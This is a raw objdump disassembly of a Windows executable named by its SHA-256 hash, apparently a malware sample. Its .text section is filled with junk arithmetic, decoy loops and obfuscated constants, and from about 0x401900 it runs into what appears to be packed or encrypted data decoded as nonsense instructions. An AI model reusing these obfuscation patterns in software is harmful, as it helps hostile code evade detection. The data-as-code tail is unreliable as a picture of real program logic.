
b38d5a2fa6ce6cc0228062f4d886c5e887c4c24dbcb4ac0599f61491584767d3.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xa4
  401009:	mov    ecx,DWORD PTR [ebp+0x8]
  40100c:	and    DWORD PTR ds:0x425010,0x0
  401016:	jmp    0x401026
  40101b:	mov    eax,ds:0x425010
  401020:	inc    eax
  401021:	mov    ds:0x425010,eax
  401026:	cmp    DWORD PTR ds:0x425010,0x1f
  40102d:	jae    0x401080
  401033:	cmp    DWORD PTR ds:0x425010,0x7
  40103a:	jne    0x40105d
  401040:	push   0x36e0
  401045:	push   0x6272
  40104a:	push   0x42500c
  40104f:	push   0x428f
  401054:	push   DWORD PTR [ebp-0xc]
  401057:	call   DWORD PTR ds:0x421000
  40105d:	cmp    DWORD PTR ds:0x425010,0x6
  401064:	jne    0x401075
  40106a:	mov    eax,ds:0x425010
  40106f:	inc    eax
  401070:	mov    ds:0x425010,eax
  401075:	jmp    0x40101b
  40107a:	or     DWORD PTR ds:0x427010,edx
  401080:	mov    eax,0x8a85
  401085:	or     DWORD PTR ds:0x427008,0x42601c
  40108f:	xor    ax,WORD PTR [ecx+0x20]
  401093:	and    DWORD PTR ds:0x429008,0x0
  40109d:	jmp    0x4010af
  4010a2:	mov    ecx,DWORD PTR ds:0x429008
  4010a8:	inc    ecx
  4010a9:	mov    DWORD PTR ds:0x429008,ecx
  4010af:	cmp    DWORD PTR ds:0x429008,0x1d
  4010b6:	jae    0x4010f5
  4010bc:	cmp    DWORD PTR ds:0x429008,0xc
  4010c3:	jne    0x4010d4
  4010c9:	push   0x803a
  4010ce:	call   DWORD PTR ds:0x421048
  4010d4:	cmp    DWORD PTR ds:0x429008,0xb
  4010db:	jne    0x4010f0
  4010e1:	xor    ecx,ecx
  4010e3:	xor    ecx,DWORD PTR ds:0x429008
  4010e9:	inc    ecx
  4010ea:	mov    DWORD PTR ds:0x429008,ecx
  4010f0:	jmp    0x4010a2
  4010f5:	mov    ecx,0x3b4b
  4010fa:	inc    DWORD PTR ds:0x427010
  401100:	add    ax,cx
  401103:	movzx  eax,ax
  401106:	adc    ecx,DWORD PTR ds:0x428010
  40110c:	mov    DWORD PTR [ebp-0x18],eax
  40110f:	mov    ecx,DWORD PTR ds:0x41d25c
  401115:	mov    ecx,DWORD PTR [ecx]
  401117:	sub    DWORD PTR ds:0x429014,ecx
  40111d:	mov    BYTE PTR [ebp-0x1],0x61
  401121:	and    DWORD PTR ds:0x428008,ebx
  401127:	lea    eax,[ebp-0x1]
  40112a:	sbb    ecx,0x3fcf
  401130:	mov    DWORD PTR [ebp-0x10],eax
  401133:	xor    ecx,ecx
  401135:	xor    ecx,DWORD PTR ds:0x425024
  40113b:	adc    ecx,DWORD PTR ds:0x427004
  401141:	mov    DWORD PTR ds:0x425024,ecx
  401147:	mov    al,BYTE PTR [ebp-0x1]
  40114a:	mov    ecx,DWORD PTR ds:0x42901c
  401150:	sub    DWORD PTR ds:0x42500c,ecx
  401156:	mov    ecx,DWORD PTR [ebp-0x10]
  401159:	xor    al,0x6f
  40115b:	xor    DWORD PTR ds:0x427004,0x42500c
  401165:	sub    al,0xd
  401167:	mov    BYTE PTR [ecx],al
  401169:	adc    DWORD PTR ds:0x429008,0x362f
  401173:	mov    DWORD PTR [ebp-0x14],0xf89c85b6
  40117a:	mov    DWORD PTR ds:0x425020,0x1b
  401184:	cmp    DWORD PTR ds:0x425020,0x0
  40118b:	je     0x4011bb
  401191:	cmp    DWORD PTR ds:0x425020,0x24
  401198:	jne    0x4011a7
  40119e:	push   DWORD PTR [ebp-0x1c]
  4011a1:	call   DWORD PTR ds:0x421004
  4011a7:	mov    ecx,DWORD PTR ds:0x425020
  4011ad:	dec    ecx
  4011ae:	mov    DWORD PTR ds:0x425020,ecx
  4011b4:	jmp    0x401184
  4011b9:	sub    ecx,eax
  4011bb:	push   ebx
  4011bc:	and    DWORD PTR ds:0x42501c,ebx
  4011c2:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4011c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4011cc:	push   esi
  4011cd:	mov    eax,0x7510893
  4011d2:	or     esi,DWORD PTR ds:0x42500c
  4011d8:	xor    ecx,eax
  4011da:	and    DWORD PTR ds:0x425024,0x1a45
  4011e4:	mov    esi,0x3272db
  4011e9:	sub    DWORD PTR ds:0x428018,0x2ac6
  4011f3:	push   edi
  4011f4:	and    DWORD PTR ds:0x426014,0x5a76
  4011fe:	add    ecx,esi
  401200:	jmp    0x401210
  401205:	mov    dl,BYTE PTR [ebp-0x1]
  401208:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40120f:	inc    ecx
  401210:	mov    DWORD PTR ds:0x427010,0x6b59
  40121a:	cmp    ecx,0x40
  40121d:	mov    DWORD PTR ds:0x425020,0x57b3
  401227:	jb     0x401205
  40122d:	mov    edx,DWORD PTR [ebp-0x14]
  401230:	xor    edx,eax
  401232:	add    edx,esi
  401234:	mov    DWORD PTR ds:0x425010,0x7b99
  40123e:	jmp    0x4012e7
  401243:	adc    ecx,DWORD PTR ds:0x427014
  401249:	mov    edi,DWORD PTR [ebp+0x8]
  40124c:	sbb    DWORD PTR ds:0x426014,ebx
  401252:	mov    ecx,0x8a85
  401257:	sub    DWORD PTR ds:0x425014,0x206e
  401261:	xor    cx,WORD PTR [edi+edx*4+0x2]
  401266:	xor    edi,0x3e7b
  40126c:	mov    edi,0x3b4b
  401271:	and    DWORD PTR ds:0x425000,0x427018
  40127b:	add    cx,di
  40127e:	add    DWORD PTR ds:0x42901c,0x429008
  401288:	movzx  ecx,cx
  40128b:	sbb    DWORD PTR ds:0x428004,0x754
  401295:	mov    DWORD PTR [ebp-0x10],ecx
  401298:	sub    DWORD PTR ds:0x42800c,0x1052
  4012a2:	mov    ecx,DWORD PTR [ebp+0x8]
  4012a5:	xor    DWORD PTR ds:0x426018,0x427004
  4012af:	movzx  ecx,WORD PTR [ecx+edx*4]
  4012b3:	or     DWORD PTR ds:0x429018,0x4238
  4012bd:	xor    ecx,0x8a85
  4012c3:	sbb    DWORD PTR ds:0x426014,0x4641
  4012cd:	add    ecx,edi
  4012cf:	mov    DWORD PTR ds:0x428018,ecx
  4012d5:	mov    edi,DWORD PTR [ebp-0x10]
  4012d8:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  4012df:	movzx  ecx,BYTE PTR ds:0x425000
  4012e6:	inc    edx
  4012e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4012ea:	mov    DWORD PTR ds:0x428014,0x5338
  4012f4:	cmp    edx,ecx
  4012f6:	mov    DWORD PTR ds:0x425020,0x6df9
  401300:	jne    0x401243
  401306:	mov    ecx,DWORD PTR [ebp-0x14]
  401309:	mov    DWORD PTR ds:0x425010,0x1f
  401313:	cmp    DWORD PTR ds:0x425010,0x0
  40131a:	je     0x401367
  401320:	cmp    DWORD PTR ds:0x425010,0x25
  401327:	jne    0x40134b
  40132d:	push   0x41feeb
  401332:	push   0x8a20
  401337:	push   DWORD PTR [ebp-0x10]
  40133a:	push   DWORD PTR [ebp-0x14]
  40133d:	push   0x4d55
  401342:	push   DWORD PTR [ebp-0x1c]
  401345:	call   DWORD PTR ds:0x42104c
  40134b:	mov    edx,DWORD PTR ds:0x425010
  401351:	dec    edx
  401352:	mov    DWORD PTR ds:0x425010,edx
  401358:	jmp    0x401313
  40135d:	xor    DWORD PTR ds:0x428008,0x4304
  401367:	mov    edx,DWORD PTR [ebp+0x10]
  40136a:	add    DWORD PTR ds:0x425008,0x427004
  401374:	xor    ecx,eax
  401376:	or     DWORD PTR ds:0x426014,0x42701c
  401380:	add    ecx,esi
  401382:	mov    DWORD PTR [edx],ecx
  401384:	sbb    DWORD PTR ds:0x429004,0x53ee
  40138e:	mov    ecx,DWORD PTR [ebp-0x14]
  401391:	xor    ecx,eax
  401393:	add    ecx,esi
  401395:	mov    DWORD PTR [ebp-0x20],ecx
  401398:	mov    DWORD PTR [ebp+0x8],0xf89c85b6
  40139f:	mov    DWORD PTR [ebp-0xc],0xf89c85a6
  4013a6:	mov    DWORD PTR [ebp-0x1c],0xf89c95b6
  4013ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4013b0:	mov    DWORD PTR [ebp+0x8],ecx
  4013b3:	mov    DWORD PTR ds:0x42801c,0x197a
  4013bd:	jmp    0x4015fd
  4013c2:	movzx  edx,BYTE PTR ds:0x426010
  4013c9:	sbb    DWORD PTR ds:0x42600c,edx
  4013cf:	mov    ecx,DWORD PTR [ebp+0x8]
  4013d2:	xor    edx,edx
  4013d4:	xor    edx,DWORD PTR ds:0x426018
  4013da:	or     edx,DWORD PTR ds:0x42500c
  4013e0:	mov    DWORD PTR ds:0x426018,edx
  4013e6:	mov    edx,DWORD PTR [ebp-0x8]
  4013e9:	xor    ecx,eax
  4013eb:	mov    DWORD PTR ds:0x427008,0x2495
  4013f5:	xor    edx,eax
  4013f7:	add    DWORD PTR ds:0x426010,0x397c
  401401:	sub    ecx,edx
  401403:	sub    DWORD PTR ds:0x425020,0x386b
  40140d:	sub    ecx,esi
  40140f:	xor    edx,edx
  401411:	or     edx,DWORD PTR ds:0x428004
  401417:	sub    DWORD PTR ds:0x42501c,edx
  40141d:	xor    ecx,eax
  40141f:	mov    DWORD PTR [ebp+0x8],ecx
  401422:	mov    ecx,DWORD PTR [ebp+0x8]
  401425:	mov    edx,DWORD PTR [ebp-0x64]
  401428:	lea    ecx,[edx+ecx*1+0x5708f5]
  40142f:	mov    DWORD PTR [ebp-0x64],ecx
  401432:	mov    DWORD PTR ds:0x428004,0x1f
  40143c:	cmp    DWORD PTR ds:0x428004,0x0
  401443:	je     0x40147a
  401449:	cmp    DWORD PTR ds:0x428004,0x29
  401450:	jne    0x401466
  401456:	push   0x41ff61
  40145b:	push   0x870a
  401460:	call   DWORD PTR ds:0x421008
  401466:	mov    ecx,DWORD PTR ds:0x428004
  40146c:	dec    ecx
  40146d:	mov    DWORD PTR ds:0x428004,ecx
  401473:	jmp    0x40143c
  401478:	and    edx,ecx
  40147a:	mov    ecx,DWORD PTR [ebp+0x8]
  40147d:	or     edx,DWORD PTR ds:0x429014
  401483:	mov    edx,DWORD PTR [ebp-0x60]
  401486:	sbb    DWORD PTR ds:0x42501c,0x5031
  401490:	lea    ecx,[edx+ecx*1+0x5708f5]
  401497:	inc    edx
  401498:	mov    DWORD PTR [ebp-0x60],ecx
  40149b:	mov    ecx,DWORD PTR [ebp+0x8]
  40149e:	mov    edx,DWORD PTR [ebp-0x5c]
  4014a1:	sub    DWORD PTR ds:0x429018,0x425020
  4014ab:	lea    ecx,[edx+ecx*1+0x5708f4]
  4014b2:	and    DWORD PTR ds:0x429010,0x0
  4014bc:	mov    edx,DWORD PTR ds:0x429010
  4014c2:	inc    edx
  4014c3:	mov    DWORD PTR ds:0x429010,edx
  4014c9:	cmp    DWORD PTR ds:0x429010,0x1b
  4014d0:	jne    0x4014e1
  4014d6:	push   0x8182
  4014db:	call   DWORD PTR ds:0x421014
  4014e1:	cmp    DWORD PTR ds:0x429010,0x11
  4014e8:	jb     0x4014bc
  4014ee:	mov    DWORD PTR [ebp-0x5c],ecx
  4014f1:	sbb    edx,0x6f22
  4014f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4014fa:	and    DWORD PTR ds:0x425008,0x0
  401504:	mov    edx,DWORD PTR ds:0x425008
  40150a:	inc    edx
  40150b:	mov    DWORD PTR ds:0x425008,edx
  401511:	cmp    DWORD PTR ds:0x425008,0x16
  401518:	jne    0x40152e
  40151e:	push   0x41ff81
  401523:	push   0x41febb
  401528:	call   DWORD PTR ds:0x421050
  40152e:	cmp    DWORD PTR ds:0x425008,0x14
  401535:	jb     0x401504
  40153b:	mov    edx,DWORD PTR [ebp-0x58]
  40153e:	xor    DWORD PTR ds:0x429008,0x42900c
  401548:	lea    ecx,[edx+ecx*1+0x5708fb]
  40154f:	and    DWORD PTR ds:0x42801c,0x0
  401559:	mov    edx,DWORD PTR ds:0x42801c
  40155f:	inc    edx
  401560:	mov    DWORD PTR ds:0x42801c,edx
  401566:	cmp    DWORD PTR ds:0x42801c,0x1f
  40156d:	jne    0x401583
  401573:	push   0x3426
  401578:	push   0x86d1
  40157d:	call   DWORD PTR ds:0x421054
  401583:	cmp    DWORD PTR ds:0x42801c,0x17
  40158a:	jb     0x401559
  401590:	mov    DWORD PTR [ebp-0x58],ecx
  401593:	mov    ecx,DWORD PTR [ebp+0x8]
  401596:	mov    edx,DWORD PTR [ebp-0x54]
  401599:	lea    ecx,[edx+ecx*1+0x5708fa]
  4015a0:	and    DWORD PTR ds:0x426010,0x0
  4015aa:	mov    edx,DWORD PTR ds:0x426010
  4015b0:	inc    edx
  4015b1:	mov    DWORD PTR ds:0x426010,edx
  4015b7:	cmp    DWORD PTR ds:0x426010,0x2b
  4015be:	jne    0x4015cd
  4015c4:	push   DWORD PTR [ebp-0x24]
  4015c7:	call   DWORD PTR ds:0x421018
  4015cd:	cmp    DWORD PTR ds:0x426010,0x1e
  4015d4:	jb     0x4015aa
  4015da:	mov    DWORD PTR [ebp-0x54],ecx
  4015dd:	or     ecx,0x6900
  4015e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4015e6:	and    DWORD PTR ds:0x426000,0x2d7e
  4015f0:	mov    edx,DWORD PTR [ebp-0x50]
  4015f3:	lea    ecx,[edx+ecx*1+0x5708f9]
  4015fa:	mov    DWORD PTR [ebp-0x50],ecx
  4015fd:	xor    ecx,0x7fc1
  401603:	mov    ecx,DWORD PTR [ebp+0x8]
  401606:	xor    ecx,eax
  401608:	add    ecx,esi
  40160a:	jne    0x4013c2
  401610:	mov    DWORD PTR ds:0x425028,0xb4d
  40161a:	jmp    0x401891
  40161f:	and    DWORD PTR ds:0x425024,0x0
  401629:	jmp    0x40163b
  40162e:	mov    edx,DWORD PTR ds:0x425024
  401634:	inc    edx
  401635:	mov    DWORD PTR ds:0x425024,edx
  40163b:	cmp    DWORD PTR ds:0x425024,0x13
  401642:	jae    0x40168a
  401648:	cmp    DWORD PTR ds:0x425024,0x4
  40164f:	jne    0x40166b
  401655:	push   0x84c6
  40165a:	push   DWORD PTR [ebp-0xc]
  40165d:	push   DWORD PTR [ebp-0x10]
  401660:	push   0x5448
  401665:	call   DWORD PTR ds:0x42101c
  40166b:	cmp    DWORD PTR ds:0x425024,0x3
  401672:	jne    0x401685
  401678:	mov    edx,DWORD PTR ds:0x425024
  40167e:	inc    edx
  40167f:	mov    DWORD PTR ds:0x425024,edx
  401685:	jmp    0x40162e
  40168a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40168d:	or     DWORD PTR ds:0x427010,0x1874
  401697:	mov    edx,DWORD PTR [ebp-0x8]
  40169a:	or     DWORD PTR ds:0x42900c,0x427008
  4016a4:	xor    ecx,eax
  4016a6:	add    DWORD PTR ds:0x425028,0x427010
  4016b0:	xor    edx,eax
  4016b2:	sub    ecx,edx
  4016b4:	sub    ecx,esi
  4016b6:	xor    ecx,eax
  4016b8:	mov    DWORD PTR ds:0x426018,0x1f6a
  4016c2:	mov    DWORD PTR [ebp-0x1c],ecx
  4016c5:	mov    ecx,DWORD PTR [ebp-0xc]
  4016c8:	mov    DWORD PTR [ebp+0x8],ecx
  4016cb:	jmp    0x4016fd
  4016d0:	mov    ecx,DWORD PTR [ebp+0x8]
  4016d3:	mov    edx,DWORD PTR [ebp-0x8]
  4016d6:	xor    ecx,eax
  4016d8:	xor    edx,eax
  4016da:	sub    ecx,edx
  4016dc:	sub    ecx,esi
  4016de:	xor    ecx,eax
  4016e0:	mov    DWORD PTR [ebp+0x8],ecx
  4016e3:	mov    ecx,DWORD PTR [ebp+0x8]
  4016e6:	mov    edx,DWORD PTR [ebp+0x8]
  4016e9:	imul   edx,edx,0x5708f5
  4016ef:	xor    ecx,eax
  4016f1:	add    ecx,esi
  4016f3:	lea    ecx,[ebp+ecx*4-0x64]
  4016f7:	mov    edi,DWORD PTR [ecx]
  4016f9:	add    edx,edi
  4016fb:	mov    DWORD PTR [ecx],edx
  4016fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401700:	xor    ecx,eax
  401702:	add    ecx,esi
  401704:	jne    0x4016d0
  40170a:	mov    ecx,DWORD PTR [ebp-0x20]
  40170d:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401714:	mov    dl,BYTE PTR [ebp-0x1]
  401717:	cmp    cl,dl
  401719:	je     0x4017f2
  40171f:	mov    ecx,DWORD PTR [ebp-0x20]
  401722:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  401729:	mov    edx,DWORD PTR [ebp+0xc]
  40172c:	cmp    cl,BYTE PTR [edx]
  40172e:	jne    0x4018a3
  401734:	mov    ecx,DWORD PTR [ebp-0x14]
  401737:	mov    edx,DWORD PTR [ebp+0xc]
  40173a:	movsx  edx,BYTE PTR [edx]
  40173d:	xor    ecx,eax
  40173f:	add    ecx,esi
  401741:	cmp    edx,ecx
  401743:	mov    ecx,DWORD PTR [ebp-0xc]
  401746:	mov    DWORD PTR [ebp+0x8],ecx
  401749:	mov    ecx,DWORD PTR [ebp+0x8]
  40174c:	je     0x403ca2
  401752:	jmp    0x401787
  401757:	mov    ecx,DWORD PTR [ebp+0x8]
  40175a:	mov    edx,DWORD PTR [ebp-0x8]
  40175d:	xor    ecx,eax
  40175f:	xor    edx,eax
  401761:	sub    ecx,edx
  401763:	sub    ecx,esi
  401765:	xor    ecx,eax
  401767:	mov    DWORD PTR [ebp+0x8],ecx
  40176a:	mov    ecx,DWORD PTR [ebp+0x8]
  40176d:	mov    edx,DWORD PTR [ebp+0x8]
  401770:	xor    ecx,eax
  401772:	imul   edx,edx,0x5708f5
  401778:	add    ecx,esi
  40177a:	lea    ecx,[ebp+ecx*4-0x64]
  40177e:	mov    edi,DWORD PTR [ecx]
  401780:	add    edx,edi
  401782:	mov    DWORD PTR [ecx],edx
  401784:	mov    ecx,DWORD PTR [ebp+0x8]
  401787:	xor    ecx,eax
  401789:	add    ecx,esi
  40178b:	jne    0x401757
  401791:	mov    ecx,DWORD PTR [ebp-0x14]
  401794:	mov    edx,DWORD PTR [ebp+0x8]
  401797:	xor    ecx,eax
  401799:	xor    edx,eax
  40179b:	add    ecx,esi
  40179d:	add    edx,esi
  40179f:	cmp    ecx,edx
  4017a1:	jae    0x401837
  4017a7:	lea    edx,[ecx-0x3272db]
  4017ad:	mov    DWORD PTR [ebp-0x18],edx
  4017b0:	mov    edi,DWORD PTR [ebp-0x18]
  4017b3:	mov    DWORD PTR [ebp-0x24],0x705fd08
  4017ba:	lea    edx,[ebp-0x24]
  4017bd:	mov    DWORD PTR [ebp-0x10],edx
  4017c0:	mov    edx,DWORD PTR [ebp-0x10]
  4017c3:	add    DWORD PTR [edx],0x705fa08
  4017c9:	mov    ebx,DWORD PTR [ebp-0x10]
  4017cc:	xor    edi,eax
  4017ce:	add    edi,DWORD PTR [ebx]
  4017d0:	lea    edx,[ebp+ecx*4-0x64]
  4017d4:	mov    ebx,DWORD PTR [edx]
  4017d6:	xor    edi,ebx
  4017d8:	mov    DWORD PTR [edx],edi
  4017da:	mov    edx,DWORD PTR [ebp+0x8]
  4017dd:	xor    edx,eax
  4017df:	inc    ecx
  4017e0:	inc    DWORD PTR [ebp-0x18]
  4017e3:	add    edx,esi
  4017e5:	cmp    ecx,edx
  4017e7:	jb     0x4017b0
  4017ed:	jmp    0x401837
  4017f2:	mov    ecx,DWORD PTR [ebp-0xc]
  4017f5:	mov    DWORD PTR [ebp+0x8],ecx
  4017f8:	jmp    0x40182a
  4017fd:	mov    ecx,DWORD PTR [ebp+0x8]
  401800:	mov    edx,DWORD PTR [ebp-0x8]
  401803:	xor    ecx,eax
  401805:	xor    edx,eax
  401807:	sub    ecx,edx
  401809:	sub    ecx,esi
  40180b:	xor    ecx,eax
  40180d:	mov    DWORD PTR [ebp+0x8],ecx
  401810:	mov    ecx,DWORD PTR [ebp+0x8]
  401813:	mov    edx,DWORD PTR [ebp+0x8]
  401816:	imul   edx,edx,0x5708f5
  40181c:	xor    ecx,eax
  40181e:	add    ecx,esi
  401820:	lea    ecx,[ebp+ecx*4-0x64]
  401824:	mov    edi,DWORD PTR [ecx]
  401826:	add    edx,edi
  401828:	mov    DWORD PTR [ecx],edx
  40182a:	mov    ecx,DWORD PTR [ebp+0x8]
  40182d:	xor    ecx,eax
  40182f:	add    ecx,esi
  401831:	jne    0x4017fd
  401837:	mov    ecx,DWORD PTR [ebp-0xc]
  40183a:	mov    DWORD PTR [ebp+0x8],ecx
  40183d:	jmp    0x40186f
  401842:	mov    ecx,DWORD PTR [ebp+0x8]
  401845:	mov    edx,DWORD PTR [ebp-0x8]
  401848:	xor    ecx,eax
  40184a:	xor    edx,eax
  40184c:	sub    ecx,edx
  40184e:	sub    ecx,esi
  401850:	xor    ecx,eax
  401852:	mov    DWORD PTR [ebp+0x8],ecx
  401855:	mov    ecx,DWORD PTR [ebp+0x8]
  401858:	mov    edx,DWORD PTR [ebp+0x8]
  40185b:	imul   edx,edx,0x5708f5
  401861:	xor    ecx,eax
  401863:	add    ecx,esi
  401865:	lea    ecx,[ebp+ecx*4-0x64]
  401869:	mov    edi,DWORD PTR [ecx]
  40186b:	add    edx,edi
  40186d:	mov    DWORD PTR [ecx],edx
  40186f:	mov    ecx,DWORD PTR [ebp+0x8]
  401872:	xor    ecx,eax
  401874:	add    ecx,esi
  401876:	jne    0x401842
  40187c:	mov    ecx,DWORD PTR [ebp-0x8]
  40187f:	mov    edx,DWORD PTR [ebp-0x20]
  401882:	xor    ecx,eax
  401884:	lea    ecx,[ecx+edx*1+0x3272db]
  40188b:	mov    DWORD PTR [ebp-0x20],ecx
  40188e:	inc    DWORD PTR [ebp+0xc]
  401891:	mov    ecx,DWORD PTR [ebp-0x1c]
  401894:	xor    ecx,eax
  401896:	add    ecx,esi
  401898:	jne    0x40161f
  40189e:	jmp    0x403cac
  4018a3:	mov    ecx,DWORD PTR [ebp-0xc]
  4018a6:	mov    DWORD PTR [ebp+0x8],ecx
  4018a9:	jmp    0x4018db
  4018ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4018b1:	mov    edx,DWORD PTR [ebp-0x8]
  4018b4:	xor    ecx,eax
  4018b6:	xor    edx,eax
  4018b8:	sub    ecx,edx
  4018ba:	sub    ecx,esi
  4018bc:	xor    ecx,eax
  4018be:	mov    DWORD PTR [ebp+0x8],ecx
  4018c1:	mov    ecx,DWORD PTR [ebp+0x8]
  4018c4:	mov    edx,DWORD PTR [ebp+0x8]
  4018c7:	imul   edx,edx,0x5708f5
  4018cd:	xor    ecx,eax
  4018cf:	add    ecx,esi
  4018d1:	lea    ecx,[ebp+ecx*4-0x64]
  4018d5:	mov    edi,DWORD PTR [ecx]
  4018d7:	add    edx,edi
  4018d9:	mov    DWORD PTR [ecx],edx
  4018db:	mov    ecx,DWORD PTR [ebp+0x8]
  4018de:	xor    ecx,eax
  4018e0:	add    ecx,esi
  4018e2:	jne    0x4018ae
  4018e8:	jmp    0x403cb8
  4018ed:	mov    ecx,DWORD PTR [ebp+0x8]
  4018f0:	mov    edx,DWORD PTR [ebp-0x8]
  4018f3:	xor    ecx,eax
  4018f5:	xor    edx,eax
  4018f7:	sub    ecx,edx
  4018f9:	sub    ecx,esi
  4018fb:	jmp    0x403c80
  401900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401901:	js     0x401926
  401903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401904:	mov    ds:0x673a7a3,eax
  401909:	je     0x401894
  40190b:	stos   DWORD PTR es:[edi],eax
  40190c:	ss leave 
  40190e:	xchg   esp,eax
  40190f:	mul    DWORD PTR [edx+0x62]
  401912:	bound  esp,QWORD PTR [edx+0x1a]
  401915:	pop    edi
  401916:	bound  esp,QWORD PTR [edx+0x9]
  401919:	xor    BYTE PTR [edi],al
  40191b:	cmp    eax,0xf033905
  401920:	jns    0x4018b4
  401922:	jbe    0x40199a
  401924:	adc    DWORD PTR [edi+0x2a717272],esp
  40192a:	fld    st(0)
  40192c:	std    
  40192d:	dec    esp
  40192e:	push   esp
  40192f:	jae    0x4019ae
  401931:	inc    ebx
  401932:	mov    WORD PTR [ecx+esi*2+0x45],?
  401936:	scas   eax,DWORD PTR es:[edi]
  401937:	inc    ecx
  401938:	push   edx
  401939:	cmp    al,0x90
  40193b:	loop   0x4018d4
  40193d:	data16 jnp 0x40196b
  401940:	call   0x26d1:0xfbbbb819
  401947:	hlt    
  401948:	xor    BYTE PTR [ebx+0x5811b5de],bl
  40194e:	dec    ebp
  40194f:	and    bl,cl
  401951:	std    
  401952:	pop    ds
  401953:	int    0x30
  401955:	xor    BYTE PTR [ebx+0x79a0c1de],cl
  40195b:	test   al,0x21
  40195d:	mov    al,ds:0x6ad39963
  401962:	clc    
  401963:	cmp    DWORD PTR [edi-0x74],esi
  401966:	mov    ecx,DWORD PTR [ebx+0x38d84edc]
  40196c:	mov    ecx,0x536582b9
  401971:	mov    ch,0x26
  401973:	idiv   BYTE PTR es:[ebx+0x2a413552]
  40197a:	push   es
  40197b:	arpl   sp,bx
  40197d:	push   edi
  40197e:	jne    0x401920
  401980:	and    ch,bh
  401982:	stos   BYTE PTR es:[edi],al
  401983:	adc    al,0xd1
  401985:	cmp    esi,eax
  401987:	mov    al,0x56
  401989:	dec    edi
  40198a:	ret    
  40198b:	adc    al,0x67
  40198d:	and    ebx,DWORD PTR [eax-0x5a2f20df]
  401993:	jmp    0x43e55a22
  401998:	fwait
  401999:	into   
  40199a:	or     al,0xa3
  40199c:	div    DWORD PTR [edi+0x5]
  40199f:	mov    esi,0x9d47fa53
  4019a4:	add    ebx,esi
  4019a6:	retw   0x3f19
  4019aa:	sti    
  4019ab:	retf   0xf32e
  4019ae:	xor    esi,DWORD PTR [ebx]
  4019b0:	or     edi,edx
  4019b2:	and    BYTE PTR [edx+0x78],ah
  4019b5:	or     BYTE PTR [edi+0x32],bl
  4019b8:	mov    esi,0xfa19aaf1
  4019bd:	lahf   
  4019be:	mov    al,0xbe
  4019c0:	add    ebx,DWORD PTR [esi+0x2c]
  4019c3:	xlat   BYTE PTR ds:[ebx]
  4019c4:	mov    edi,0x95bc1719
  4019c9:	mov    eax,0x22d49c82
  4019ce:	pop    es
  4019cf:	frstor [esi]
  4019d1:	les    eax,FWORD PTR [ebx]
  4019d3:	hlt    
  4019d4:	data16 jmp 0x401a0d
  4019d7:	cmp    ecx,DWORD PTR [ebp-0x40]
  4019da:	test   DWORD PTR [ebp+0x21a69377],0xdb1f9a4b
  4019e4:	inc    edx
  4019e5:	push   es
  4019e6:	xor    eax,0x87fb8468
  4019eb:	inc    edi
  4019ec:	pop    ecx
  4019ed:	sbb    DWORD PTR [ebx-0x45],ebp
  4019f0:	pop    eax
  4019f1:	jmp    0x4019ed
  4019f3:	push   0x82ac3f
  4019f8:	pop    ds
  4019f9:	push   0xffffffeb
  4019fb:	shr    BYTE PTR [ecx],0x7d
  4019fe:	sbb    edi,DWORD PTR [esi]
  401a00:	inc    edx
  401a01:	sub    BYTE PTR [ebp+edx*1-0x59],0x34
  401a06:	std    
  401a07:	pop    edi
  401a08:	nop
  401a09:	cld    
  401a0a:	push   ebp
  401a0b:	xlat   BYTE PTR ds:[ebx]
  401a0c:	fsubr  DWORD PTR [eax]
  401a0e:	(bad)  
  401a0f:	adc    DWORD PTR [ebp-0x3754b457],ebp
  401a15:	call   0xdf90a9a3
  401a1a:	(bad)  
  401a1b:	xor    BYTE PTR [edx+0x26a6ab6d],ch
  401a21:	mov    eax,0x8a079f6c
  401a26:	imul   eax,edi,0x73
  401a29:	or     esp,DWORD PTR [ecx+0x7]
  401a2c:	mov    eax,0x9cbc09eb
  401a31:	mov    BYTE PTR [ebx+0x709333f0],dl
  401a37:	stos   BYTE PTR es:[edi],al
  401a38:	fsub   DWORD PTR [edx-0x5c]
  401a3b:	call   0x510:0x63a6b572
  401a42:	mov    esi,0xffc2e1a8
  401a47:	pop    ds
  401a48:	jb     0x401a00
  401a4a:	int3   
  401a4b:	push   esi
  401a4c:	scas   eax,DWORD PTR es:[edi]
  401a4d:	retf   
  401a4e:	ins    DWORD PTR es:[edi],dx
  401a4f:	jl     0x401a5a
  401a51:	xchg   ebx,eax
  401a52:	dec    edi
  401a53:	ss inc esp
  401a55:	stos   DWORD PTR es:[edi],eax
  401a56:	jp     0x401a47
  401a58:	push   eax
  401a59:	arpl   WORD PTR [ecx],bx
  401a5b:	inc    ebx
  401a5c:	jle    0x401aa5
  401a5e:	mov    WORD PTR [edi+edx*2+0x79],?
  401a62:	fidivr DWORD PTR [ecx]
  401a64:	sahf   
  401a65:	inc    esi
  401a66:	lahf   
  401a67:	dec    eax
  401a68:	lods   al,BYTE PTR ds:[esi]
  401a69:	jno    0x401a2c
  401a6b:	xor    esi,ebp
  401a6d:	shr    BYTE PTR [edi+0x27],0x61
  401a71:	imul   esi,eax,0x407c5f0b
  401a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a78:	stos   DWORD PTR es:[edi],eax
  401a79:	mov    eax,ds:0xffa5afb6
  401a7e:	ss xchg esp,eax
  401a80:	cmp    cl,BYTE PTR [edx-0x424c7298]
  401a86:	dec    ecx
  401a87:	ja     0x401b07
  401a89:	sbb    eax,0xecc1300d
  401a8e:	ret    0x4a8
  401a91:	pop    ecx
  401a92:	test   dl,dl
  401a94:	mov    bl,BYTE PTR [edx+0x16aa2c6f]
  401a9a:	dec    ebp
  401a9b:	rcr    DWORD PTR [ebx-0x3d],1
  401a9e:	ss mov dh,0x4c
